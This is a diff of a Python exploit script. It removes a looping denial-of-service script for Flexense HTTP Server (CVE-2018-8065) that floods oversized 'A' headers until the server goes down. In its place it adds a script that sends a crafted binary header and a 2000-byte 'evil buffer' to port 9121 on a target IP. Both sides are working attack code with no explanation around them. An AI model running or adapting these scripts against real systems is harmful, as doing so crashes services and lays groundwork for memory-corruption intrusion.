@@ -1,52 +1,34 @@
 #!/usr/bin/python
-# -*- coding: utf-8 -*-
-
 import socket
 import sys
-import random
-import time
+from struct import pack
 
+try:
+    server = sys.argv[1]
+    port = 9121
+    size = 2000
 
-if len(sys.argv) < 2:
-    print "[*] Usage: "+sys.argv[0]+" <ip> <port>"
-    exit()
+    inputBuffer = b"\x41" * size
 
-print """
-#==============================================#
-# Title: Flexense HTTP Server <= 10.6.24 DOS   #
-# CVE:2018-8065                                #
-# Author: Ege Balcı                            # 
-# Contact: ege.balci[at]invictuseurope[dot]com #
-#==============================================#
+    header =  b"\x75\x19\xba\xab"
+    header += b"\x03\x00\x00\x00"
+    header += b"\x00\x40\x00\x00"
+    header += pack('<I', len(inputBuffer))
+    header += pack('<I', len(inputBuffer))
+    header += pack('<I', inputBuffer[-1])
 
- """
+    buf = header + inputBuffer
 
-sent = 0
-o = 1
+    print("Sending evil buffer...")
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((server, port))
+    s.send(buf)
+    s.close()
 
-while True:
+    print("Done!")
 
-    payload = ""
-    u = (['\\','|','/','-'])
-    rnd = random.randrange(0,4)
-    if o == 4:
-	    o = 0
-
-    payload = "GET /"+("A"*random.randrange(0,8000))+" HTTP/0.9\n"
-    payload += "Host: 192.168.1.111\n"
-    payload += "User-Agent: "+("A"*random.randrange(0,8000))+"\n"
-    payload += "Accept: "+("A"*random.randrange(0,8000))+"\r\n\r\n"
-
-    try:
-        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        connect = s.connect((sys.argv[1],int(sys.argv[2])))
-        s.send(payload)
-        s.close()    
-        sys.stdout.flush()		
-        sys.stdout.write("\r[{1}] Bombarding: {0}".format(sent,u[o]))
-        sent += 1
-        o +=  1
-        time.sleep(float(0.005))
-    except:
-        print "\n[+] Server down !!"
-        exit()
+except IndexError:
+    print(f"Usage: {sys.argv[0]} <target_ip>")
+except socket.error:
+    print("could not connect!")
+    
